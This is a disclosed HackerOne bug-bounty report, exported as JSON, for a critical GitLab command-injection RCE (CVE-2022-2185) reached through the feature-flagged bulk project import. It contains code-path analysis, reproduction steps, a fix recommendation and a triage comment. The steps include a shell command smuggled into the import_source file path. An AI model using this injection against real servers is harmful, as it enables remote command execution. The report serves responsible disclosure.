{
  "id": 1609965,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjA5OTY1",
  "url": "https://hackerone.com/reports/1609965",
  "title": "RCE via the DecompressedArchiveSizeValidator and Project BulkImports (behind feature flag)",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2022-06-23T03:05:28.695Z",
  "submitted_at": "2022-06-23T03:05:28.831Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "vakzz",
    "url": "/vakzz",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/6zbovkumst7oljmo9v21pig3yh9j/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c?response-content-disposition=inline%3B%20filename%3D%2294971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg%22%3B%20filename%2A%3DUTF-8%27%2794971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070026Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3a2461442f2a01f46fc219db92fb2ff2d9adda95794cbea1481d1a2e5dfc8059"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 264,
    "url": "https://hackerone.com/gitlab",
    "handle": "gitlab",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [

    ],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "GitLab",
      "twitter_handle": "gitlab",
      "website": "https://about.gitlab.com",
      "about": "A single application for the entire software development lifecycle."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2022-2185"
  ],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2022-09-13T04:40:52.091Z",
  "bug_reporter_agreed_on_going_public_at": "2022-08-05T07:30:40.178Z",
  "team_member_agreed_on_going_public_at": "2022-09-13T04:40:51.878Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "### Summary\n\nThe `DecompressedArchiveSizeValidator` is used to check the size of a archive before extracting it:\n\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/v15.1.0-ee/lib/gitlab/import_export/decompressed_archive_size_validator.rb#L82\n```ruby\n      def command\n        \"gzip -dc #{@archive_path} | wc -c\"\n      end\n\n   def validate\n        pgrp = nil\n        valid_archive = true\n\n        Timeout.timeout(TIMEOUT_LIMIT) do\n          stdin, stdout, stderr, wait_thr = Open3.popen3(command, pgroup: true)\n          stdin.close\n```\n\nSince `command` is a string and passed directly to `Open3.popen3` it will be interpreted as a shell command, so if `archive_path` contains any special characters it can be used to run arbitrary commands.\n\nOne of the places that the `DecompressedArchiveSizeValidator` is used is in the [Gitlab::ImportExport::FileImporter](https://gitlab.com/gitlab-org/gitlab/-/blob/v15.1.0-ee/lib/gitlab/import_export/file_importer.rb#L110),\n\n```ruby\n     def size_validator\n        @size_validator ||= DecompressedArchiveSizeValidator.new(archive_path: @archive_file)\n      end\n```\n\nIt gets `@archive_file` from  the constructor, and is used by the [Gitlab::ImportExport::Importer](https://gitlab.com/gitlab-org/gitlab/-/blob/v15.1.0-ee/lib/gitlab/import_export/importer.rb#L48) which gets it from `project.import_source`.\n\nUnder normal circumstances `import_source` is nil and is generated by the `FileImporter` using `@archive_file = File.join(@shared.archive_path, Gitlab::ImportExport.export_filename(exportable: @importable))`.\n\nMost of the places I've checked do not allow you to set the `import_source` for a project, or have the `import_type` set to something other than `gitlab_project` or `gitlab_custom_project_template` (which is required to use the `::Gitlab::ImportExport::Importer`).\n\nThere is one place though, in the `BulkImports::Projects::Pipelines::ProjectPipeline`. Luckily this is disabled by default as it requires the `bulk_import_projects` feature to be enabled. If/once this feature is enabled, it's possible to trigger the above flow.\n\nThis is possible as the two transformer on the `ProjectPipeline` are `:BulkImports::Common::Transformers::ProhibitedAttributesTransformer` and `::BulkImports::Projects::Transformers::ProjectAttributesTransformer`,  which first removes a list of prohibited keys:\n\n```ruby\nPROHIBITED_REFERENCES = Regexp.union(\n          /\\Acached_markdown_version\\Z/,\n          /\\Aid\\Z/,\n          /_id\\Z/,\n          /_ids\\Z/,\n          /_html\\Z/,\n          /attributes/,\n          /\\Aremote_\\w+_(url|urls|request_header)\\Z/ # carrierwave automatically creates these attribute methods for uploads\n        ).freeze\n```\n\nAnd then sets a few other values:\n```ruby\n          entity = context.entity\n          visibility = data.delete('visibility')\n\n          data['name'] = entity.destination_name\n          data['path'] = entity.destination_name.parameterize\n          data['import_type'] = PROJECT_IMPORT_TYPE\n          data['visibility_level'] = Gitlab::VisibilityLevel.string_options[visibility] if visibility.present?\n          data['namespace_id'] = Namespace.find_by_full_path(entity.destination_namespace)&.id if entity.destination_namespace.present?\n\n          data.transform_keys!(&:to_sym)\n```\n\nAll of the other params are allowed and passed directly into `project = ::Projects::CreateService.new(context.current_user, data).execute`. The first thing the create service does its to check if it's creating from a template, and if so the `CreateFromTemplateService` is used instead:\n\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/v15.1.0-ee/app/services/projects/create_service.rb#L25-27\n```ruby\n    def execute\n     if create_from_template?\n        return ::Projects::CreateFromTemplateService.new(current_user, params).execute\n      end\n    # ...\n    end\n\n    def create_from_template?\n      @params[:template_name].present? || @params[:template_project_id].present?\n    end\n```\n\nSince we control all of the params, this path can be triggered by setting `template_name` to a valid template such as `rails`.  This then uses the `GitlabProjectsImportService` which allows the `import_type` to be changed from `gitlab_project_migration` to `gitlab_project`.\n\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/v15.1.0-ee/app/services/projects/gitlab_projects_import_service.rb#L61-76\n```ruby\n    def prepare_import_params\n      data = {}\n      data[:override_params] = @override_params if @override_params\n\n      if overwrite_project?\n        data[:original_path] = params[:path]\n        params[:path] += \"-#{tmp_filename}\"\n      end\n\n      if template_file\n        data[:sample_data] = params.delete(:sample_data) if params.key?(:sample_data)\n        params[:import_type] = 'gitlab_project'\n      end\n\n      params[:import_data] = { data: data } if data.present?\n    end\n```\n\nThe `Projects::CreateService` service is then called again with the updated `import_type`, but the rest of our params the same. This causes the `import_schedule` to happen as `@project.gitlab_project_migration?` is no longer true\n\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/v15.1.0-ee/app/services/projects/create_service.rb#L276-282\n```ruby\n    def import_schedule\n      if @project.errors.empty?\n        @project.import_state.schedule if @project.import? && !@project.bare_repository_import? && !@project.gitlab_project_migration?\n      else\n        fail(error: @project.errors.full_messages.join(', '))\n      end\n    end\n```\n\nIf a custom `import_source` was used, it will be used as the `@archive_file` for the `Gitlab::ImportExport::FileImporter`.  After `wait_for_archived_file` has reached `MAX_RETRIES` (it continues instead of failing) then `validate_decompressed_archive_size` will be called and then `Open3.popen3` with a controllable string.\n\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/v15.1.0-ee/lib/gitlab/import_export/file_importer.rb#L45\n\n```ruby\n       wait_for_archived_file do\n          validate_decompressed_archive_size if Feature.enabled?(:validate_import_decompressed_archive_size)\n          decompress_archive\n        end\n\n      def wait_for_archived_file\n        MAX_RETRIES.times do |retry_number|\n          break if File.exist?(@archive_file)\n\n          sleep(2**retry_number)\n        end\n\n        yield\n      end\n```\n\n### Steps to reproduce\n\n1. spin up a gitlab instance\n1. ssh in and enable bulk project imports with from a rails console: `sudo gitlab-rails console` then `::Feature.enable(:bulk_import_projects)`\n1. start watching the logs with `sudo gitlab-ctl tail`\n1. create an api token\n1. create a new group\n1. create a new project in that group\n1. download {F1785226} and change `PROJECT_PATH` to the full path of the project above and `PROJECT_ID` to its id\n1. change `\"import_source\":\"/tmp/ggg;echo lala|tee /tmp/1234;#\",` to be your custom command (it cannot contain `>` as json will convert it to `\\u003c`)\n1. (optional) remove `proxies={\"http\":\"http://127.0.0.1:8080\", \"https\":\"http://127.0.0.1:8080\"}` if you are not using burp/another proxy\n1. run it with `FLASK_APP=api_project_ql.py flask run`\n1. start ngrok with `ngrok http 5000`\n1.  go to new group -> import group\n1. enter the ngrok http address and your token from above in the `Import groups from another instance of GitLab` section\n1. select the group created above, change the parent to `No parent` and choose a new group name\n1. hit import\n1. you should see requests being made, then after the project is imported and the `wait_for_archived_file` has timed out (takes a few minutes) you should see something like following error in the logs and the payload will execute:\n\n```\ncommand exited with error code 2: tar (child): /tmp/ggg;echo lala|tee /tmp/1234;#: Cannot open: No such file or directory\ntar (child): Error is not recoverable: exiting now\ntar: Child returned status 2\ntar: Error is not recoverable: exiting now\n```\n\n```bash\nvagrant@gitlab:~$ cat /tmp/1234\nlala\nvagrant@gitlab:~$\n```\n\n### Impact\n\nIf the `bulk_import_projects` feature is enabled, allows an attacker to execute arbitrary commands on a gitlab server\n\n\n### What is the current *bug* behavior?\n* The `DecompressedArchiveSizeValidator` passes a string to `popen` that can contain attacker controlled data\n* The `ProjectPipeline` does not correctly filter the project params\n\n### What is the expected *correct* behavior?\n* The `DecompressedArchiveSizeValidator` should use `Gitlab::Popen` and the command should be an array of strings\n* The `ProjectPipeline` should use the `Gitlab::ImportExport::AttributeCleaner` or just have a whitelist of allowed params\n\n### Relevant logs and/or screenshots\n\n```json\n{\n    \"severity\": \"ERROR\",\n    \"time\": \"2022-06-23T01:52:57.556Z\",\n    \"correlation_id\": \"0d72e54e82938b4b82aa3dcafe6c4dfe\",\n    \"exception.class\": \"Gitlab::ImportExport::Error\",\n    \"exception.message\": \"command exited with error code 2: tar (child): /tmp/ggg;echo lala|tee /tmp/1234;#: Cannot open: No such file or directory\\ntar (child): Error is not recoverable: exiting now\\ntar: Child returned status 2\\ntar: Error is not recoverable: exiting now\",\n    \"user.username\": \"vakzz\",\n    \"tags.program\": \"sidekiq\",\n    \"tags.locale\": \"en\",\n    \"tags.feature_category\": \"importers\",\n    \"tags.correlation_id\": \"0d72e54e82938b4b82aa3dcafe6c4dfe\",\n    \"extra.sidekiq\": {\n        \"retry\": false,\n        \"queue\": \"repository_import\",\n        \"version\": 0,\n        \"backtrace\": 5,\n        \"dead\": false,\n        \"status_expiration\": 86400,\n        \"memory_killer_memory_growth_kb\": 50,\n        \"memory_killer_max_memory_growth_kb\": 300000,\n        \"args\": [\n            \"31\"\n        ],\n        \"class\": \"RepositoryImportWorker\",\n        \"jid\": \"9d28590a58ec7db944453edc\",\n        \"created_at\": 1655948922.4369478,\n        \"correlation_id\": \"0d72e54e82938b4b82aa3dcafe6c4dfe\",\n        \"meta.user\": \"vakzz\",\n        \"meta.client_id\": \"user/2\",\n        \"meta.caller_id\": \"BulkImports::PipelineWorker\",\n        \"meta.remote_ip\": \"192.168.0.144\",\n        \"meta.feature_category\": \"importers\",\n        \"meta.root_caller_id\": \"Import::BulkImportsController#create\",\n        \"meta.project\": \"imported_13/export_project\",\n        \"meta.root_namespace\": \"imported_13\",\n        \"worker_data_consistency\": \"always\",\n        \"idempotency_key\": \"resque:gitlab:duplicate:repository_import:e64a87ccd733ff3c9b12cd20d98ea1d44a21196e9d0398c0af668ee84bf77358\",\n        \"size_limiter\": \"validated\",\n        \"enqueued_at\": 1655948922.442958\n    },\n    \"extra.importer\": \"Import/Export\",\n    \"extra.exportable_id\": 31,\n    \"extra.exportable_path\": \"imported_13/export_project\",\n    \"extra.import_jid\": null\n}\n```\n\n### Output of checks\n#### Results of GitLab environment info\n\n```\nSystem information\nSystem:\t\tUbuntu 20.04\nProxy:\t\tno\nCurrent User:\tgit\nUsing RVM:\tno\nRuby Version:\t2.7.5p203\nGem Version:\t3.1.4\nBundler Version:2.3.15\nRake Version:\t13.0.6\nRedis Version:\t6.2.7\nSidekiq Version:6.4.0\nGo Version:\tunknown\n\nGitLab information\nVersion:\t15.1.0-ee\nRevision:\t31c24d2d864\nDirectory:\t/opt/gitlab/embedded/service/gitlab-rails\nDB Adapter:\tPostgreSQL\nDB Version:\t12.10\nURL:\t\thttp://gitlab.wbowling.info\nHTTP Clone URL:\thttp://gitlab.wbowling.info/some-group/some-project.git\nSSH Clone URL:\tgit@gitlab.wbowling.info:some-group/some-project.git\nElasticsearch:\tno\nGeo:\t\tno\nUsing LDAP:\tno\nUsing Omniauth:\tyes\nOmniauth Providers:\n\nGitLab Shell\nVersion:\t14.7.4\nRepository storage paths:\n- default: \t/var/opt/gitlab/git-data/repositories\nGitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell\n```\n\n## Impact\n\nIf the `bulk_import_projects` feature is enabled, allows an attacker to execute arbitrary commands on a gitlab server.",
  "bounty_amount": "33510.0",
  "formatted_bounty": "$33,510",
  "weakness": {
    "id": 58,
    "name": "Command Injection - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 1785226,
      "file_name": "api_project_ql.py",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/tvzrzl7wohlwhw466rornjse92sk?response-content-disposition=attachment%3B%20filename%3D%22api_project_ql.py%22%3B%20filename%2A%3DUTF-8%27%27api_project_ql.py&response-content-type=text%2Fx-python-script&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070026Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=78cc6de696ba5fb5ce3d182117ffcb297ef57806daeac19e5e5c3c0a309794b9",
      "file_size": 2609,
      "type": "text/x-python-script",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 250,
  "voters": [
    "winteri3coming",
    "ferken3",
    "shafou",
    "akr3ch",
    "alex_volk",
    "viridian_40826d",
    "subtlegrowth",
    "jumpydata",
    "kntjrld",
    "zzero",
    "and 240 more..."
  ],
  "severity": {
    "rating": "critical",
    "score": 9.9,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "low",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "high"
    }
  },
  "structured_scope": {
    "databaseId": 39022,
    "asset_type": "OTHER",
    "asset_identifier": "Your Own GitLab Instance",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [

    ],
    "assignable_team_member_groups": [

    ]
  },
  "activities": [
    {
      "id": 17254239,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hey @vakzz,\n\nThanks for the report. A colleague and I are both getting `403` responses at Step 13 & 14. Can you provide a different method/stub API to test this, and/or help us debug?\n\nI've set the Project Path & Project ID. Is it to do with what port gitlab is running on locally? (I have GDK set up at `gdk.test:3000` locally, mapping to localhost).\n\nAttached are the ngrok log, ngrok in a chrome tab, and the result when trying to import a project.\n\nCheers,\nNick Malcolm\nGitLab Security Team",
      "automated_response": false,
      "created_at": "2022-06-23T08:00:15.577Z",
      "updated_at": "2022-06-23T08:00:15.577Z",
      "actor": {
        "username": "nmalcolm_gitlab",
        "cleared": false,
        "verified": false,
        "url": "/nmalcolm_gitlab",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/qugqy57v49704ukw2816cro62zrc/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "attachments": [
        {
          "id": 1785463,
          "filename": "Screen_Shot_2022-06-23_at_7.58.03_PM.png",
          "type": "image/png",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/txoojcmp08sxul696nhpha4xeqco?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2022-06-23_at_7.58.03_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2022-06-23_at_7.58.03_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070026Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=263ccb53013557263b3f8d6356b3e4f0ea98485463d67c1f56508fd81c982ca3"
        },
        {
          "id": 1785462,
          "filename": "Screen_Shot_2022-06-23_at_7.58.42_PM.png",
          "type": "image/png",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/1z343pgyby3k9wlquw4qiyxj4x7u?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2022-06-23_at_7.58.42_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2022-06-23_at_7.58.42_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070026Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ba97f933f1e2df6393ee9bb9dd35e33e096b52f0c1aee192fc5dae13a290d364"
        },
        {
          "id": 1785461,
          "filename": "Screen_Shot_2022-06-23_at_7.58.49_PM.png",
          "type": "image/png",
